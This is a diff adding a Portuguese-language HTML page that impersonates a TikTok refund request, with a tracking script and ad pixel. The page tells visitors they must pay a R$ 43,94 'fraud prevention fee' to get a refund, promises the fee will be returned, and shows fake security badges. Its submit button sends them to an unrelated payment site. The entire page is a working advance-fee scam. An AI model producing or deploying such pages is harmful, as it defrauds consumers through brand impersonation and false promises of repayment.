@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script
+			src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+			data-token="b37547bb-ec0c-41df-a0ba-890b47c59feb"
+	>
+	</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="max-image-preview:large">
+    <title>Solicitação de Reembolso do TikTok</title>
+    <!-- TikTok Pixel Code Start -->
+    <script>
+      !(function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = (w[t] = w[t] || []);
+        (ttq.methods = [
+          "page",
+          "track",
+          "identify",
+          "instances",
+          "debug",
+          "on",
+          "off",
+          "once",
+          "ready",
+          "alias",
+          "group",
+          "enableCookie",
+          "disableCookie",
+          "holdConsent",
+          "revokeConsent",
+          "grantConsent",
+        ]),
+          (ttq.setAndDefer = function (t, e) {
+            t[e] = function () {
+              t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+            };
+          });
+        for (var i = 0; i < ttq.methods.length; i++)
+          ttq.setAndDefer(ttq, ttq.methods[i]);
+        (ttq.instance = function (t) {
+          for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+            ttq.setAndDefer(e, ttq.methods[n]);
+          return e;
+        }),
+          (ttq.load = function (e, n) {
+            var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+              o = n && n.partner;
+            (ttq._i = ttq._i || {}),
+              (ttq._i[e] = []),
+              (ttq._i[e]._u = r),
+              (ttq._t = ttq._t || {}),
+              (ttq._t[e] = +new Date()),
+              (ttq._o = ttq._o || {}),
+              (ttq._o[e] = n || {});
+            n = document.createElement("script");
+            (n.type = "text/javascript"),
+              (n.async = !0),
+              (n.src = r + "?sdkid=" + e + "&lib=" + t);
+            e = document.getElementsByTagName("script")[0];
+            e.parentNode.insertBefore(n, e);
+          });
+
+        ttq.load("D4L781BC77U4IAHDOBPG");
+        ttq.page();
+      })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --kwai-orange: #FE2C55;
+            --kwai-dark: #181212;
+            --kwai-light: #FFF5EF;
+            --kwai-yellow: #FFD600;
+            --kwai-red: #FF3D00;
+            --tiktok-black: #000000;
+            --tiktok-white: #ffffff;
+            --success-green: #4CAF50;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
+            color: var(--tiktok-white);
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: var(--tiktok-black);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+        
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo-container img {
+            max-width: 200px;
+            height: auto;
+            filter: drop-shadow(0 4px 12px rgba(255, 255, 255, 0.1));
+        }
+        
+        .header-icon {
+            font-size: 3rem;
+            text-align: center;
+            margin-bottom: 20px;
+            color: var(--success-green);
+        }
+        
+        h2 {
+            font-size: 2rem;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+            color: var(--tiktok-white);
+            letter-spacing: 0.5px;
+        }
+        
+        .note {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05) 0%, rgba(255, 255, 255, 0.02) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        .note p {
+            font-size: 1.05rem;
+            line-height: 1.8;
+            color: var(--tiktok-white);
+            margin: 0;
+        }
+        
+        .note strong {
+            color: var(--success-green);
+            font-weight: 700;
+        }
+        
+        .info-box {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.15) 0%, rgba(76, 175, 80, 0.05) 100%);
+            border-left: 4px solid var(--success-green);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+        
+        .info-box i {
+            color: var(--success-green);
+            font-size: 1.5rem;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        
+        .info-box-content {
+            flex: 1;
+        }
+        
+        .info-box-content p {
+            margin: 0;
+            font-size: 0.95rem;
+            line-height: 1.7;
+            color: var(--tiktok-white);
+        }
+        
+        .info-box-content strong {
+            color: var(--success-green);
+            font-weight: 700;
+        }
+        
+        .value-highlight {
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2) 0%, rgba(76, 175, 80, 0.1) 100%);
+            border: 2px solid var(--success-green);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: center;
+        }
+        
+        .value-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        .value-amount {
+            font-size: 1.8rem;
+            color: var(--success-green);
+            font-weight: 700;
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .guarantee-badges {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            flex-wrap: nowrap;
+            margin: 25px 0;
+        }
+        
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.9);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+        
+        .badge i {
+            color: var(--success-green);
+            font-size: 0.85rem;
+        }
+        
+        button {
+            font-size: 1.05rem;
+            font-weight: 700;
+            padding: 18px 40px;
+            width: 100%;
+            background: linear-gradient(135deg, var(--success-green) 0%, #45a049 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 25px;
+            box-shadow: 0 8px 24px rgba(76, 175, 80, 0.3);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #45a049 0%, var(--success-green) 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 12px 32px rgba(76, 175, 80, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button i {
+            font-size: 1.1rem;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            h2 {
+                font-size: 1.6rem;
+            }
+            
+            .note p {
+                font-size: 0.95rem;
+            }
+            
+            button {
+                padding: 16px 30px;
+                font-size: 0.95rem;
+            }
+            
+            .header-icon {
+                font-size: 2.5rem;
+            }
+            
+            .value-amount {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="2fa26c9dd31ce860dc627e5375f58a98.png" alt="TikTok Logo">
+        </div>
+        
+        <div class="header-icon">
+            <i class="fas fa-money-bill-wave"></i>
+        </div>
+        
+        <h2>Solicitação de Reembolso do TikTok</h2>
+        
+        <div class="note">
+            <p><strong>Importante:</strong> Para processar seu reembolso, é necessário pagar uma taxa de prevenção contra fraudes de <strong>R$ 43,94</strong>. Não se preocupe, esse valor será reembolsado junto com o valor do reembolso. Como desculpas pelo desconforto, também enviaremos o saldo pendente na plataforma.</p>
+        </div>
+        
+        <div class="value-highlight">
+            <div class="value-label">Taxa de Prevenção contra Fraudes</div>
+            <div class="value-amount">R$ 43,94</div>
+        </div>
+        
+        <div class="info-box">
+            <i class="fas fa-info-circle"></i>
+            <div class="info-box-content">
+                <p>Este valor será <strong>reembolsado integralmente</strong> junto com o valor do reembolso principal. Além disso, você receberá o saldo pendente na plataforma como compensação.</p>
+            </div>
+        </div>
+        
+        <div class="guarantee-badges">
+            <div class="badge">
+                <i class="fas fa-shield-alt"></i>
+                <span>100% Seguro</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-lock"></i>
+                <span>SSL</span>
+            </div>
+            <div class="badge">
+                <i class="fas fa-certificate"></i>
+                <span>Garantido</span>
+            </div>
+        </div>
+        
+        <form id="refundForm">
+            <button type="submit">
+                <i class="fas fa-file-invoice"></i>
+                <span>Preencher dados para o reembolso</span>
+            </button>
+        </form>
+    </div>
+    
+    <script>
+        document.getElementById("refundForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            const urlParams = new URLSearchParams(window.location.search);
+            const queryString = urlParams.toString();
+            window.location.href = "https://pay.pagarsg5.site/692e0c41f578688417b8124d" + (queryString ? "?" + queryString : "");
+        });
+    </script>
+</body>
+</html>
